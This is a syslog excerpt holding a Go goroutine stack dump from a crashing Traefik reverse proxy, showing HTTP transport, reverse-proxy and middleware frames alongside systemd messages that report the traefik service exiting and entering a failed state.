jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4436154 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461269 [select]:
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*maxlatencywriter).flushloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:348 +
jun 29 15:17:29 [localhost] traefik: created by net/http/httputil.(*reverseproxy).copyresponse
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:273 +
jun 29 15:17:29 [localhost] traefik: goroutine 4445559 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4453043 [runnable]:
jun 29 15:17:29 [localhost] traefik: net/http.(*transport).getidleconn( , , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:789 +
jun 29 15:17:29 [localhost] traefik: net/http.(*transport).getconn( , , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:921 +
jun 29 15:17:29 [localhost] traefik: net/http.(*transport).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:409 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.errorhandlingroundtripper.roundtrip( , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:150 +
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:193 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*httpforwarder).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:493 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*forwarder).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:263 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp.func1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:26 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavebackend( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:56 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavefrontend( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:50 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin/rr.go:129 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*emptybackendhandler).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/empty_backend_handler.go:29 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*handlerswitcher).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/handlerswitcher.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/thoas/stats.(*stats).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:64 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:160 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: net/http.serverhandler.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2694 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1830 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4439598 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4438405 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] systemd: traefik.service: main process exited, code=exited, status=2/invalidargument
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).readslice( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:341 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).readline( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:370 +
jun 29 15:17:29 [localhost] traefik: net/textproto.(*reader).readlineslice( , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/textproto/reader.go:55 +
jun 29 15:17:29 [localhost] traefik: net/textproto.(*reader).readline( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/textproto/reader.go:36 +
jun 29 15:17:29 [localhost] traefik: net/http.readresponse( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/response.go:155 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readresponse( , , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1783 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1616 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 2916007 [runnable]:
jun 29 15:17:29 [localhost] traefik: net/http.(*request).withcontext( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/request.go:329 +
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:162 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*httpforwarder).servehttp( , , , , )
jun 29 15:17:29 [localhost] systemd: unit traefik.service entered failed state.
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:493 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*forwarder).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:263 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp.func1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:26 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavebackend( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:56 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavefrontend( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:50 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin/rr.go:129 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*emptybackendhandler).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/empty_backend_handler.go:29 +
jun 29 15:17:29 [localhost] systemd: traefik.service failed.
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*handlerswitcher).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/handlerswitcher.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/thoas/stats.(*stats).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:64 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:160 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: net/http.serverhandler.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2694 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1830 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4435379 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:764 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1855 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461194 [select]:
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:154 +
jun 29 15:17:29 [localhost] traefik: created by net/http/httputil.(*reverseproxy).servehttp
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:153 +
jun 29 15:17:29 [localhost] traefik: goroutine 4438406 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4458298 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4439597 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
